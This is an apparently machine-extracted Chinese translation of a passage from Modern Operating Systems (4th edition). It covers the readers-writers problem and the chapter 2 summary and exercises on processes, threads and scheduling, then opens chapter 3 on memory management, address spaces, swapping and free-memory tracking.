图2-48给出了一种解法。
图2-48 读者-写者问题的一种解法
在该解法中，第一个读者对信号量db 执行down 操作。
随后的读者只是递增一个计数器rc 。
当读者 离开时，它们递减这个计数器，而最后一个读者则对信号量执行up, 这样就允许一个被阻塞的写者(如 果存在的话)可以访问该数据库。
在该解法中，隐含着一个需要注解的条件。
假设一个读者正使用数据库，另一个读者来了。
同时有 两个读者并不存在问题，第二个读者被允许进入。
如果有第三个和更多的读者来了也同样允许。
现在，假设一个写者到来。
由于写者的访问是排他的，不能允许写者进入数据库，只能被挂起。
只 要还有一个读者在活动，就允许后续的读者进来。
这种策略的结果是，如果有一个稳定的读者流存在， 那么这些读者将在到达后被允许进入。
而写者就始终被挂起，直到没有读者为止。
如果来了新的读者， 比如，每2秒钟一个，而每个读者花费5秒钟完成其工作，那么写者就永远没有机会了。
为了避免这一情形，可以稍微改变一下程序的写法：在一个读者到达，且一个写者在等待时，读者 在写者之后被挂起，而不是立即允许进入。
用这种方式，在一个写者到达时如果有正在工作的读者，那 么该写者只要等待这个读者完成，而不必等候其后面到来的读者。
该解决方案的缺点是，并发度和效率 较低。
Courtois 等人给出了一个写者优先的解法。
详细内容请参阅他的论文。
2.6 有关进程与线程的研究
第1章介绍了当前有关操作系统结构的研究工作，在本章和后续章节中，我们将专注更多更细的研 究工作，本章先从有关进程的研究开始。
虽然这些问题最终都将得到解决，但总有一些问题会比其他问 题的解决方案更成熟。
多数研究工作不再继续围绕有数十年历史的问题，而是针对新的问题。
线程是比进程更新的概念，但也同样经过了深入的思考。
现在线程的相关研究仍然时常出现，例如， 多处理器上的线程集群 (Tam 等人，2007)、Linux 等现代操作系统对于海量线程在多核处理器上的可扩 展性 (Boyd-Wickizer,2010)。
目前还有许多研究操作系统安全问题的工作。
大量事实表明，为了抵御攻击者(偶尔也需要防护用 户自身的误操作),用户需要更完善的保护措施。
一种方法是详细地跟踪并且谨慎地限制操作系统中的 信息流 (Giffin 等人，2012)。
2 . 7小结
为了隐藏中断的影响，操作系统提供了一个并行执行串行进程的概念模型。
进程可以动态地创建和 终止，每个进程都有自己的地址空间。
对于某些应用而言，在一个进程中使用多个线程是有益的。
这些线程被独立调度并且有独立的栈， 但是在一个进程中的所有线程共享一个地址空间。
线程可以在用户态实现，也可以在内核态实现。
进程之间通过进程间通信原语来交换信息，如信号量、管程和消息。
这些原语用来确保不会有两个 进程同时在临界区中，以避免出现混乱。
一个进程可以处在运行、就绪或阻塞状态，当该进程或其他进 程执行某个进程间通信原语时，可以改变其状态。
线程间的通信也类似。
进程间通信原语可以用来解决诸如生产者一消费者问题、哲学家就餐问题、读者一写者问题和睡眠 理发师问题等。
但即便有了这些原语，也要仔细设计才能避免出错和死锁。
目前已经有大量成熟的调度算法。
一些算法主要用于批处理系统中，如最短作业优先调度算法。
其 他算法在批处理系统和交互式系统中都很常见，如轮转调度、优先级调度、多级队列调度、有保证调度、
彩票调度以及公平分享调度等。
有些系统清晰地分离了调度策略和调度机制，使用户可以配置调度 算法 。
习题
1.图2-2中给出了三个进程状态。
理论上，三个状 态之间可以有六种转换，每个状态两个。
但图 中只给出了四种转换。
其余两种转换是否可能 发生?
2.假设要设计一种先进的计算机体系结构，它使 用硬件代替中断来完成进程切换。
进程切换时 CPU需要哪些信息?
请描述用硬件完成进程切 换的工作过程。
3.当代计算机中，为什么中断处理程序至少有一 部分是由汇编语言编写的?
4.中断或系统调用把控制权转交给操作系统时， 为什么通常会用到与被中断进程的栈分离的内 核栈?
5.一个计算系统的内存有足够的空间容纳5个程 序。
这些程序有一半的时间处于等待I/O的空闲 状态。
请问CPU时间浪费的比例是多少?
6.一个计算机的RAM 有4GB, 其中操作系统占 512MB。
所有进程都占256MB (为了简化计算) 并且特征相同。
要使CPU利用率达到99%,最 大I/O等待是多少?
7.如果多个作业能够并行运行，会比它们顺序执 行完成得快。
假设有两个作业同时开始执行， 每个需要20分钟CPU时间。
如果顺序执行，那 么完成最后一个作业需要多长时间?
如果并行 执行又需要多长时间?
假设I/O等待占50%。
8.考虑一个6级多道程序系统(内存中可同时容纳 6个程序)。
假设每个进程的I/O等待占40%,那 么CPU利用率是多少?
11.当一个多线程进程创建子进程时，如果子进程 复制父进程的所有线程，就会出现问题：假如 父进程中有一个线程正在等待键盘输入，现在 就有两个线程在等待键盘输入，父进程和子进 程各有一个。
这种问题在单线程进程中也会发
生吗?
14.既然计算机中只有一套寄存器，为什么图2-12 中的寄存器集合是按每个线程列出而不是按每 个进程列出?
15.在没有时钟中断的系统中，一个线程放弃CPU 后可能再也不会获得CPU资源，那么为什么线 程还要通过调用thread_yield 自 愿 放 弃CPU?
16.线程可以被时钟中断抢占吗?
如果可以，在什 么情形下可以?
如果不可以，为什么不可以?
18.在用户态实现线程的最大优点是什么?
最大缺 点是什么?
19.图2-15中，创建线程和线程打印消息的顺序是 随机交错的。
有没有一种方法可以严格按照以 下次序运行：创建线程1,线程1打印消息，线 程1结束；创建线程2,线程2打印消息，线程2 结束；依次类推。
如果有，请说明方法；如果 没有，请解释原因。
20.在讨论线程中的全局变量时，曾使用过程 create_globe 将存储分配给指向变量的指针， 而不是变量自身。
这是必需的吗?
还是直接使 用变量自身也可行?
21.考虑一个线程全部在用户态实现的系统，该运 行时系统每秒钟获得一个时钟中断。
当某个线 程正在该运行时系统中执行时发生了一个时钟 中断，此时会出现什么问题?
你有什么解决该 问题的建议吗?
22.假设一个操作系统中不存在类似于select的 系统调用来提前判断从文件、管道或设备中 读取数据时是否安全，但该操作系统允许设 置定时来中断阻塞的系统调用。
在上述条件 下，是否有可能在用户态实现一个线程包?
请讨论。
23.两个进程在一个共享内存的多处理器(两个 CPU) 上运行，当它们要共享一块内存时， 图2-23中使用turn 变量的忙等待解决方案还有 效吗?
24.在抢占式进程调度的条件下，图2-24中互斥问 题的Peterson 解法可行吗?
如果是非抢占式调 度呢?
25.2.3.4节中所讨论的优先级反转问题在用户级线 程中是否可能发生?
为什么?
26.2.3.4节中描述了一种有高优先级进程H和低优 先级进程L的情况，导致了H陷入死循环。
若 采用轮转调度算法代替优先级调度算法，还会 发生同样问题吗?
请讨论。
27.在使用线程的系统中，若使用用户级线程，是 每个线程一个栈还是每个进程一个栈?
如果使 用内核级线程呢?
请解释。
28.在开发计算机时，通常首先用一个程序模拟执 行，一次运行一条指令，多处理器也严格按此 模拟。
在这种没有同时事件发生的情形下，会 出现竞争条件吗?
29.将生产者一消费者问题扩展成一个多生产者一 多消费者的问题，生产(消费)者都写(读) 一个共享的缓冲区，每个生产者和消费者都在 自己的线程中执行。
图2-28中使用信号量的解 法在这个系统中还可行吗?
30. 考虑对于两个进程PO和P1的互斥问题的解决方 案。
假设变量初始值为0。
PO的代码如下：
/*Other code*/
while(turn !
=0){/*Do nothing and wait/*/ Critical Section/*...*/
turn=0;
/*Other code*/
P1的代码是将上述代码中的0替换为1。
该 方法是否能处理互斥问题中所有可能的情形?
31.一个可以屏蔽中断的操作系统如何实现信号 量?
32.请说明仅通过二元信号量和普通机器指令如何 实现计数信号量(即可以保持一个任意值的信
号量)。
33.如果一个系统只有两个进程，可以使用一个屏 障来同步这两个进程吗?
为什么?
34.如果线程在内核态实现，可以使用内核信号量 对同一个进程中的两个线程进行同步吗?
如果 线程在用户态实现呢?
假设其他进程中没有线 程需要访问该信号量。
请解释你的答案。
35.管程的同步机制使用条件变量和两个特殊操作 wait 和signal 。
一种更通用的同步形式是只用 一条原语waituntil, 它以任意的布尔谓词作为 参数。
例如
waituntil x<0 or y+z<n
这样就不再需要signal 原语。
很显然这种 方法比Hoare 或Brinc Hansen方案更通用，但 它从未被采用过。
为什么?
( 提 示：请考虑其 实现。
)
37.假设有一个使用信箱的消息传递系统，当向满 信箱发消息或从空信箱收消息时，进程不会阻 塞，而是得到一个错误代码。
进程响应错误代 码的处理方式是不断地重试，直到成功为止。
这种方式会导致竞争条件吗?
38.CDC 6600计算机使用一种称作处理器共享的 有趣的轮转调度算法，可以同时处理多达10个 I/0进程。
每条指令结束后都进行进程切换，即 进程1执行指令1,进程2执行指令2,以此类推。
进程切换由特殊硬件完成，所以没有开销。
如 果在没有竞争的条件下一个进程需要T秒钟完 成，那么当有n个进程共享处理器时完成该进 程需要多长时间?
39. 考虑以下C 代码：
void main(){
fork();
fork();
exit(); }
程序执行时创建了多少子进程?
40.Round-robin 调度算法一般需要维护一个就绪 进程列表，每个进程在列表中只出现一次。
如
果某个进程在列表中出现两次会发生什么情 况?
什么情况下可以允许多次出现?
41. 是否可以通过分析源代码来确定进程是CPU 密 集型的还是I/O密集型的?
运行时如何确定?
42. 请说明在Round-robin 调度算法中时间片长度 和上下文切换时间是怎样相互影响的。
43. 对某系统进行监测后发现，在阻塞I/O 之前， 平均每个进程的运行时间为T。
一次进程切换 需要的时间为S, 这 里S实际上就是开销。
对于 采用时间片长度为Q的轮转调度，请给出以下 各种情况的CPU利用率的计算公式：
(a)Q=∞
(b)Q>T
(c)S<Q<T
(d)Q=S
(e)Q 趋近于0
44.有5个待运行作业，估计它们的运行时间分别是 9、6、3、5和X。
以何种次序运行这些作业能得 到最短的平均响应时间?
(答案将依赖于X)
45.有5个批处理作业A~E, 它们几乎同时到达一 个计算中心。
估计它们的运行时间分别为10、 6、2、4和8分钟。
其优先级(由外部设定)分 别为3、5、2、1和4,其中5为最高优先级。
对 于下列每种调度算法，计算其平均进程周转时 间，可忽略进程切换的开销。
(a) 轮转法
(b) 优先级调度
(d) 最短作业优先
对于(a), 假设系统具有多道程序处理能力， 每个作业均公平共享CPU 时间；对于(b)～(d), 假设任一时刻只有一个作业运行，直到结束。
所有的作业都是CPU 密集型作业。
46. 运行在CTSS 上的某个进程需要30个时间片才 能完成。
该进程必须被调入多少次(包括第一 次，即在该进程运行之前)?
47.一个实时系统有2个周期为5ms 的电话任务， 每次任务的CPU 时间是1ms; 还有1个周期为 33ms的视频流，每次任务的CPU时间是11ms 。
这个系统是可调度的吗?
49. 用a=1/2 的老化算法来预测运行时间。
先前 的四次运行，从最老的到最近一个，其运行时 间分别是40ms 、20ms 、40ms 和15ms。
那么下 一次的预测时间是多少?
50.一个软实时系统有4个周期时间，其周期分别 为50ms 、100ms 、200ms 和250ms。
假设这4个 事件分别需要35ms 、20ms 、10ms和x ms的CPU 时间。
保持系统可调度的最大x值是多少?
51.在哲学家就餐问题中使用如下规则：编号为偶 数的哲学家先拿他左边的叉子再拿他右边的叉 子；编号为奇数的哲学家先拿他右边的叉子再 拿他左边的叉子。
这条规则是否能避免死锁?
53.考虑一个系统，希望以策略与机制分离的方式 实现内核级线程调度。
请提出一个解决方案。
54.在哲学家就餐问题的解法(图2-47)中，为什 么在过程take_forks 中将状态变量置为
HUNGRY?
55. 考虑图2-47中的过程put_forks, 假设变量 state[i] 在对test 的两次调用之后(而不是之前) 才被置为THINKING, 这会对解法有什么影 响 ?
56.按照哪一类进程何时开始执行，读者一写者问 题可以有几种方式求解。
请详细描述该问题的 三种变体，每一种变体偏好(或不偏好)某一 类进程。
对每种变体，请指出当一个读者或写 者访问数据库时会发生什么,以及当一个进程 结束对数据库的访问后又会发生什么?
58.假设有一个提供信号量的操作系统。
请实现一 个消息系统，编写发送和接收消息的过程。
59. 使用管程代替信号量来解决哲学家就餐问题。
60.假设某大学准备把美国最高法院的信条“平等 但隔离其本身就是不平等”(Separate but equal is inherently unequal) 既运用在种族上也运用 在性别上，从而结束校园内长期使用的浴室按 性别隔离的做法。
但是，为了迁就传统习惯， 学校颁布法令：当有一个女生在浴室里时，其 他女生可以进入，但是男生不行，反之亦然。
在每个浴室的门上有一个滑动标记，表示当前 处于以下三种可能状态之一：
●空
●有女生
●有男生
用你喜欢的程序设计语言编写下面的过程： woman_wants_to_enter,man_wants_to_enter,
woman_leaves,man_leaves 。
可以随意使用计 数器和同步技术。
61.重写图2-23中的程序，使它可以处理两个以上 的进程。
62.编写一个使用线程实现的共享一个公共缓冲区 的生产者一消费者问题。
但是，不要使用信号 量或任何其他用来保护共享数据结构的同步原 语。
直接让每个线程在需要访问缓冲区时就立 即访问。
使用sleep 和wakeup 来处理缓冲区满 和空的条件。
观察需要多长时间会出现严重的 竞争条件。
例如，可以让生产者一次打印一个 数字，每分钟打印不超过一个数字，因为I/O 会影响竞争条件。
63.一个进程可以通过在Round-robin 算法的队列 中多次出现，从而提高优先级。
在数据池的不 同区域运行多个程序实例也能达到同样的效 果。
先写一个程序测试一组数是否为素数，然 后想办法让多个程序实例能同时执行，并且保 证两个不同的程序实例不会测试同一个数。
这
样做是否真的能更快地完成任务?
注意这个结 论与计算机中正在执行的别的任务有关：如果 计算机只执行了该程序的实例，则不会有性能 提升；但是如果系统中还有别的进程，该程序 应该能得到更多的使用CPU的机会。
65.实现一个统计文本文件中单词频率的程序。
将 文本文件分为N 段，每段交由一个独立的线程 处理，线程统计该段中单词的频率。
主进程等 待所有线程执行完毕后，通过各线程的输出结 果来统计整体的单词频率。
第3章 |
Modern Operating Systems,Fourth Edition
内 存 管 理
内 存 (RAM) 是计算机中一种需要认真管理的重要资源。
就目前来说，虽然一台普通家用计算机的 存储容量已经是20世纪60年代早期全球最大的计算机IBM 7094的存储容量的10000倍以上，但是程序大 小的增长速度比内存容量的增长速度要快得多。
正如帕金森定律所指出的：“不管存储器有多大，程序都 可以把它填满。
”在这一章中，我们将讨论操作系统是怎样对存储器创建抽象模型以及怎样管理它们的。
每个程序员都梦想拥有这样的存储器：它是私有的、容量无限大的、速度无限快的，并且是永久性 的(即断电时不会丢失数据)。
当我们期望这样的存储器时，何不进一步要求它价格低廉呢?
遗憾的是， 目前的技术还不能为我们提供这样的存储器。
也许你会有解决方案。
除此之外的选择是什么呢?
经过多年探索，人们提出了分层存储器体系 (memory hierarchy) 的概 念，即在这个体系中，计算机有若干兆 (MB) 快速、昂贵且易失性的高速缓存(cache), 数千兆 (GB) 速度与价格适中且同样易失性的内存，以及几兆兆 (TB) 低速、廉价、非易失性的磁盘存储，另外还 有诸如DVD和USB等可移动存储装置。
操作系统的工作是将这个存储体系抽象为一个有用的模型并管理 这个抽象模型。
操作系统中管理分层存储器体系的部分称为存储管理器 (memory manager)。
它的任务是有效地管 理内存，即记录哪些内存是正在使用的，哪些内存是空闲的；在进程需要时为其分配内存，在进程使用 完后释放内存。
本章我们会研究几个不同的存储管理方案，涵盖非常简单的方案到高度复杂的方案。
由于最底层的 高速缓存的管理由硬件来完成，本章将集中介绍针对编程人员的内存模型，以及怎样优化管理内存。
至 于永久性存储器——磁盘——的抽象和管理，则是下一章的主题。
我们会从最简单的管理方案开始讨论， 并逐步深入到更为缜密的方案。
3.1 无存储器抽象
最简单的存储器抽象就是根本没有抽象。
早期大型计算机(20世纪60年代之前)、小型计算机(20 世纪70年代之前)和个人计算机(20世纪80年代之前)都没有存储器抽象。
每一个程序都直接访问物理 内存。
当一个程序执行如下指令：
MOV REGISTER1,1000
计算机会将位置为1000的物理内存中的内容移到REGISTER1 中。
因此，那时呈现给编程人员的存储器 模型就是简单的物理内存：从0到某个上限的地址集合，每一个地址对应一个可容纳一定数目二进制位 的存储单元，通常是8个。
在这种情况下，要想在内存中同时运行两个程序是不可能的。
如果第一个程序在2000的位置写入一 个新的值，将会擦掉第二个程序存放在相同位置上的所有内容，所以同时运行两个程序是根本行不通的， 这两个程序会立刻崩溃。
不过即使存储器模型就是物理内存，还是存在一些可行选项的。
图3-1展示了三种变体。
在图3-1a 中，操作系统位于RAM (随机访问存储器)的底部；在图3-1b中，操作系统位于内存顶端的ROM ( 只 读存储器)中；而在图3-1c中，设备驱动程序位于内存顶端的ROM中，而操作系统的其他部分则位于下 面的RAM的底部。
第一种方案以前被用在大型机和小型计算机上，现在很少使用了。
第二种方案被用 在一些掌上电脑和嵌入式系统中。
第三种方案用于早期的个人计算机中(例如运行MS-DOS的计算机), 在ROM中的系统部分称为BIOS(Basic Input Output System,基本输入输出系统)。
第一种方案和第三 种方案的缺点是用户程序出现的错误可能摧毁操作系统，引发灾难性后果。
当按这种方式组织系统时，通常同一个时刻只能有一个进程在运行。
一旦用户键入了一个命令，操
作系统就把需要的程序从磁盘复制到内存中并执行；当进程运行结束后，操作系统在用户终端显示提示 符并等待新的命令。
收到新的命令后，它把新的程序装入内存，覆盖前一个程序。
图3-1 在只有操作系统和一个用户进程的情形下，组织内存的三种简单方案(当然也存在其他方案)
在没有存储器抽象的系统中实现并行的一种方法是使用多线程来编程。
由于在引入线程时就假设一 个进程中的所有线程对同一内存映像都可见，那么实现并行也就不是问题了。
虽然这个想法行得通，但 却没有被广泛使用，因为人们通常希望能够在同一时间运行没有关联的程序，而这正是线程抽象所不能 提供的。
更进一步地， 一个没有存储器抽象的系统也不大可能具有线程抽象的功能。
在不使用存储器抽象的情况下运行多个程序
但是，即使没有存储器抽象，同时运行多个程序也是可能的。
操作系统只需要把当前内存中所有内 容保存到磁盘文件中，然后把下一个程序读入到内存中再运行即可。
只要在某一个时间内存中只有一个 程序，那么就不会发生冲突。
这样的交换概念会在下面讨论。
在特殊硬件的帮助下，即使没有交换功能，并发地运行多个程序也是可能的。
IBM 360的早期模型 是这样解决的：内存被划分为2KB的块，每个块被分配一个4位的保护键，保护键存储在CPU的特殊寄 存器中。
一个内存为1MB的机器只需要512个这样的4位寄存器，容量总共为256字节。
PSW(Program Status Word,程序状态字)中存有一个4位码。
一个运行中的进程如果访问保护键与其PSW码不同的内 存，360的硬件会捕获到这一事件。
因为只有操作系统可以修改保护键，这样就可以防止用户进程之间、 用户进程和操作系统之间的互相干扰。
a) b) c)
图3-2 重定位问题的说明：a) 一个16KB程 序 ；b) 另一个16KB程 序 ；c) 两个程序连续地装载到内存中
址24,那里是一条MOV指令。
第二个程序一开始跳转到地址28,那里是一条CMP 指令。
与讨论无关的 指令没有画出来。
当两个程序被连续地装载到内存中从0开始的地址时，内存中的状态就如同图3-2c所 示。
在这个例子里，我们假设操作系统是在高地址处，图中没有画出来。
程序装载完毕之后就可以运行了。
由于它们的内存键不同，它们不会破坏对方的内存。
但在另一方 面会发生问题。
当第一个程序开始运行时，它执行了JMP24 指令，然后不出预料地跳转到了相应的指令， 这个程序会正常运行。
但是，当第一个程序已经运行了一段时间后，操作系统可能会决定开始运行第二个程序，即装载在 第一个程序之上的地址16384处的程序。
这个程序的第一条指令是JMP 28,这条指令会使程序跳转到第 一个程序的ADD指令，而不是事先设定的跳转到CMP 指令。
由于对内存地址的不正确访问，这个程序 很可能在1秒之内就崩溃了。
MOV REGISTER1,28
这样把数28送到REGISTER1的指令不可以被重定位。
装载器需要一定的方法来辨别地址和常数。
最后，正如我们在第1章中指出的，计算机世界的发展总是倾向于重复历史。
虽然直接引用物理地 址对于大型计算机、小型计算机、台式计算机和笔记本电脑来说已经成为很久远的记忆了(对此我们深 表遗憾),但是缺少存储器抽象的情况在嵌入式系统和智能卡系统中还是很常见的。
现在，像收音机、 洗衣机和微波炉这样的设备都已经完全被 (ROM 形式的)软件控制，在这些情况下，软件都采用访问 绝对内存地址的寻址方式。
在这些设备中这样能够正常工作是因为，所有运行的程序都是可以事先确定 的，用户不可能在烤面包机上自由地运行他们自己的软件。
虽然高端的嵌入式系统(比如智能手机)有复杂的操作系统，但是一般的简单嵌入式系统并非如此。
在某些情况下可以用一种简单的操作系统，它只是一个被链接到应用程序的库，该库为程序提供I/O 和 其他任务所需要的系统调用。
操作系统作为库实现的常见例子如流行的e-Cos操作系统。
3.2 一种存储器抽象：地址空间
总之，把物理地址暴露给进程会带来下面几个严重问题。
第一，如果用户程序可以寻址内存的每个 字节，它们就可以很容易地(故意地或偶然地)破坏操作系统，从而使系统慢慢地停止运行(除非使用 特殊的硬件进行保护，如IBM 360的锁键模式)。
即使在只有一个用户进程运行的情况下，这个问题也是 存在的。
第二，使用这种模型，想要同时运行(如果只有一个CPU就轮流执行)多个程序是很困难的。
在个人计算机上，同时打开几个程序是很常见的(一个文字处理器， 一个邮件程序， 一个网络浏览器), 其中一个当前正在工作，其余的在按下鼠标的时候才会被激活。
在系统中没有对物理内存的抽象的情况 下，很难实现上述情景，因此，我们需要其他办法。
3.2.1 地址空间的概念
要使多个应用程序同时处于内存中并且不互相影响，需要解决两个问题：保护和重定位。
我们来看 一个原始的对前者的解决办法，它曾被用在IBM 360上：给内存块标记上一个保护键，并且比较执行进 程的键和其访问的每个内存字的保护键。
然而，这种方法本身并没有解决后一个问题，虽然这个问题可 以通过在程序被装载时重定位程序来解决，但这是一个缓慢且复杂的解决方法。
一个更好的办法是创造一个新的存储器抽象：地址空间。
就像进程的概念创造了一类抽象的CPU以 运行程序一样，地址空间为程序创造了一种抽象的内存。
地址空间是一个进程可用于寻址内存的一套地 址集合。
每个进程都有一个自己的地址空间，并且这个地址空间独立于其他进程的地址空间(除了在一 些特殊情况下进程需要共享它们的地址空间外)。
地址空间的概念非常通用，并且在很多场合中出现。
比如电话号码，在美国和很多其他国家， 一个 本地电话号码通常是一个7位的数字。
因此，电话号码的地址空间是从0000000到9999999,虽然一些 号码并没有被使用，比如以000开头的号码。
随着手机、调制解调器和传真机数量的增长，这个空间变 得越来越不够用了，从而导致需要使用更多位数的号码。
x86 的I/O端口的地址空间从0到16383。
IPv4 的地址是32位的数字，因此它们的地址空间从0到2³²-1(也有一些保留数字)。
地址空间也可以是非数字的，以“.com” 结尾的网络域名的集合也是地址空间。
这个地址空间是由 所有包含2~63个字符并且后面跟着“.com” 的字符串组成的，组成这些字符串的字符可以是字母、数字 和连字符。
到现在你应该已经明白地址空间的概念了，它是很简单的。
比较难的是给每个程序一个自己独有的地址空间，使得一个程序中的地址28所对应的物理地 址与另一个程序中的地址28所对应的物理地址不同。
下面我们将讨论一个简单的方法，这个方法 曾经很常见，但是在有能力把更复杂(而且更好)的机制运用在现代CPU 芯片上之后，这个方法就 不再使用了。
基址寄存器与界限寄存器
这个简单的解决办法是使用动态重定位，简单地把每个进程的地址空间映射到物理内存的不同部分。
从CDC 6600 (世界上最早的超级计算机)到Intel 8088(原始IBM PC的心脏),所使用的经典办法是给 每个CPU配置两个特殊硬件寄存器，通常叫作基址寄存器和界限寄存器。
当使用基址寄存器和界限寄存 器时，程序装载到内存中连续的空闲位置且装载期间无须重定位，如图3-2c 所示。
当一个进程运行时， 程序的起始物理地址装载到基址寄存器中，程序的长度装载到界限寄存器中。
在图3-2c中，当第一个程 序运行时，装载到这些硬件寄存器中的基址和界限值分别是0和16384。
当第二个程序运行时，这些值 分别是16384和32768。
如果第三个16KB的程序被直接装载在第二个程序的地址之上并且运行，这时基 址寄存器和界限寄存器里的值会是32768和16384。
JMP 28
指令，但是硬件把这条指令解释成 JMP 16412
所以程序如我们所愿地跳转到了CMP 指令。
在图3-2c中第 二个程序的执行过程中，基址寄存器和界限寄存器的设置 如图3- 3所示。
图3-3 基址寄存器和界限寄存器可用于为 每个进程提供 一 个独立的地址空间
3.2.2 交换技术
如果计算机物理内存足够大，可以保存所有进程，那么之前提及的所有方案都或多或少是可行的。
但实际上，所有进程所需的RAM数量总和通常要远远超出存储器能够支持的范围。
在一个典型的Windows、
oS X或Linux 系统中，在计算机完成引导后会启动50~100个甚至更多的进程。
例如，当一个Windows 应 用程序安装后，通常会发出一系列命令，使得在此后的系统引导中会启动一个仅仅用于查看该应用程序 更新的进程。
这样一个进程会轻易地占据5~10MB的内存。
其他后台进程还会查看所收到的邮件和进来 的网络连接，以及其他很多诸如此类的任务。
并且，这一切都发生在第一个用户程序启动之前。
当前重 要的应用程序如Photoshop 一启动就轻易地占据500MB内存，而开始处理数据后可能需要数千兆字节 (GB) 的空间。
因此，把所有进程一直保存在内存中需要巨大的内存，如果内存不够，就做不到这一点。
有两种处理内存超载的通用方法。
最简单的策略是交 换 (swapping) 技术，即把一个进程完整调入 内存，使该进程运行一段时间，然后把它存回磁盘。
空闲进程主要存储在磁盘上，所以当它们不运行时 就不会占用内存(尽管其中的一些进程会周期性地被唤醒以完成相关工作，然后就又进入睡眠状态)。
另一种策略是虚拟内存(virtual memory),该策略甚至能使程序在只有一部分被调入内存的情况下运行。
下面先讨论交换技术，3.3节我们将考察虚拟内存。
交换系统的操作如图3-4所示。
开始时内存中只有进程A。
之后创建进程B和C 或者从磁盘将它们换 入内存。
图3-4d显示A 被交换到磁盘。
然后D 被调入，B 被调出，最后A 再次被调入。
由于A 的位置发生 变化，所以在它换入的时候通过软件或者在程序运行期间(多数是这种情况)通过硬件对其地址进行重 定位。
例如，基址寄存器和界限寄存器就适用于这种情况。
时间 十
a) b) c) d) e) f) g)
图3-4 内存分配情况随着进程进出而变化，阴影区域表示未使用的内存
交换在内存中产生了多个空闲区 (hole, 也称为空洞),通过把所有的进程尽可能向下移动，有可 能将这些小的空闲区合成一大块。
该技术称为内存紧缩 (memo ry compaction)。
通常不进行这个操作， 因为它要耗费大量的CPU时间。
例如， 一台有16GB内存的计算机可以每8ns 复制8个字节，它紧缩全部 内存大约要花费16s。
有一个问题值得注意，即当进程被创建或换入时应该为它分配多大的内存。
若进程创建时其 大小是固定的并且不再改变，则分配很简单，操作系统准确地按其需要的大小进行分配，不多也 不少。
但是如果进程的数据段可以增长，例如，很多程序设计语言都允许从堆中动态地分配内存，那么当 进程空间试图增长时，就会出现问题。
若进程与一个空闲区相邻，那么可把该空闲区分配给进程供其增大。
另一方面，若进程相邻的是另一个进程，那么要么把需要增长的进程移到内存中一个足够大的区域中去， 要么把一个或多个进程交换出去，以便生成一个足够大的空闲区。
若一个进程在内存中不能增长，而且磁 盘上的交换区也已满了，那么这个进程只有挂起直到一些空间空闲(或者可以结束该进程)。
如果大部分进程在运行时都要增长，为了减少因内存区域不够而引起的进程交换和移动所产生的开
销，一种可用的方法是，当换入或移动进程时为它分配一些额外的内存。
然而，当进程被换出到磁盘上 时，应该只交换进程实际上使用的内存中的内容，将额外的内存交换出去是一种浪费。
在图3-5a中读者 可以看到 一 种已为两个进程分配了增长空间的内存配置。
a) b)
图3-5 a) 为可能增长的数据段预留空间； b) 为可能增长的数据段和堆栈段预留空间
如果进程有两个可增长的段，例如，供变量动态分配和释放的作为堆使用的一个数据段，以及存放 普通局部变量与返回地址的一个堆栈段，则可使用另一种安排，如图3-5b所示。
在图中可以看到所示进 程的堆栈段在进程所占内存的顶端并向下增长，紧接在程序段后面的数据段向上增长。
在这两者之间的 内存可以供两个段使用。
如果用完了，进程或者必须移动到足够大的空闲区中(它可以被交换出内存直 到内存中有足够的空间),或者结束该进程。
3.2.3 空闲内存管理
在动态分配内存时，操作系统必须对其进行管理。
一般而言，有两种方法跟踪内存使用情况：位图 和空闲区链表。
在本节和下一节中将介绍这两种方法。
第10章将详细介绍Linux系统中使用的一些特定 的 内 存 分 配 器 ( 如 伙 伴 分 配 器 和slab分配器)。
1. 使用位图的存储管理
使用位图方法时，内存可能被划分成小到几个字或大到几千字节的分配单元。
每个分配单元对应于 位图中的一位，0表示空闲，1表示占用(或者相反)。
一块内存区和其对应的位图如图3-6所示。
图3-6 a)一段有5个进程和3个空闲区的内存，刻度表示内存分配单元，阴影区域表示空闲(在位图中用0 表 示 ) ; b) 对 应 的 位 图 ；c) 用空闲区链表表示的同样的信息
分配单元的大小是一个重要的设计因素。
分配单元越小，位图越大。
然而即使只有4个字节大小的 分配单元，32位的内存也只需要位图中的1位。
32n位的内存需要n位的位图，所以位图只占用了1/32的 内存。
若选择比较大的分配单元，则位图更小。
但若进程的大小不是分配单元的整数倍，那么在最后一 个分配单元中就会有一定数量的内存被浪费了。
因为内存的大小和分配单元的大小决定了位图的大小，所以它提供了一种简单的利用一块固定大小 的内存区就能对内存使用情况进行记录的方法。
这种方法的主要问题是，在决定把一个占k个分配单元 的进程调入内存时，存储管理器必须搜索位图，在位图中找出有k个连续0的串。
查找位图中指定长度的 连续0串是耗时的操作(因为在位图中该串可能跨越字的边界),这是位图的缺点。
2.使用链表的存储管理
另一种记录内存使用情况的方法是，维护一个记录已分配内存段和空闲内存段的链表。
其中链表中 的一个结点或者包含一个进程，或者是两个进程间的一块空闲区。
可用图3-6c所示的段链表来表示图3- 6a 所示的内存布局。
链表中的每一个结点都包含以下域：空闲区(H) 或进程 (P) 的指示标志、起始地 址、长度和指向下一结点的指针。
在本例中，段链表是按照地址排序的，其好处是 当进程终止或被换出时链表的更新非常直接。
一个要 终止的进程一般有两个邻居(除非它是在内存的最底 端或最顶端),它们可能是进程也可能是空闲区，这就 导致了图3-7所示的四种组合。
在图3-7a中更新链表需 要把P替换为H; 在图3-7b和图3-7c中两个结点被合并 为一个，链表少了一个结点；在图3-7d中三个结点被合 并为一个，从链表中删除了两个结点。
X终止之前 X 终止之后
图3-7 结束进程X时与相邻区域的四种组合
进程表中表示终止进程的结点中通常含有指向对应于其段链表结点的指针，因此段链表使用双向链表 可能要比图3-6c所示的单向链表更方便。
这样的结构更易于找到上一个结点，并检查是否可以合并。
当按照地址顺序在链表中存放进程和空闲区时，有几种算法可以用来为创建的进程(或从磁盘换入 的已存在的进程)分配内存。
这里，假设存储管理器知道要为进程分配多少内存。
最简单的算法是首次 适配(first fit) 算法。
存储管理器沿着段链表进行搜索，直到找到一个足够大的空闲区，除非空闲区大 小和要分配的空间大小正好一样，否则将该空闲区分为两部分，一部分供进程使用，另一部分形成新的 空闲区。
首次适配算法是一种速度很快的算法，因为它尽可能少地搜索链表结点。
对首次适配算法进行很小的修改就可以得到下次适配(next fit) 算法。
它的工作方式和首次适配算 法相同，不同点是每次找到合适的空闲区时都记录当时的位置，以便在下次寻找空闲区时从上次结束的 地方开始搜索，而不是像首次适配算法那样每次都从头开始。
Bays(1977) 的仿真程序证明下次适配算 法的性能略低于首次适配算法。
另一个著名的并广泛应用的算法是最佳适配 ( best fit) 算法。
最佳适配算法搜索整个链表(从开始 到结束),找出能够容纳进程的最小的空闲区。
